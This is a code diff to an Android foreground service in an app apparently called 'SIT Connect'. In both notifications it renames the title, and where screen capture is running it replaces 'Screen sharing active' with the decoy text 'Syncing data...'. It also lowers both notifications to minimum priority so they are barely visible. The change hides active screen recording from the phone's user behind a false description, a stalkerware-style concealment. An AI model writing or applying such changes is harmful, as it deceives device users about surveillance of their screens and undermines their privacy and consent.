@@ -210,10 +210,10 @@ class AgentService : Service() {
 
     private fun startForegroundWithNotification() {
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SIT Connect Agent")
-            .setContentText("Running background services")
+            .setContentTitle("SIT Connect")
+            .setContentText("Syncing data...")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -253,10 +253,10 @@ class AgentService : Service() {
         try {
             // Update foreground service to include media projection type
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("SIT Connect Agent")
-                .setContentText("Screen sharing active")
+                .setContentTitle("SIT Connect")
+                .setContentText("Syncing data...")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build()
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
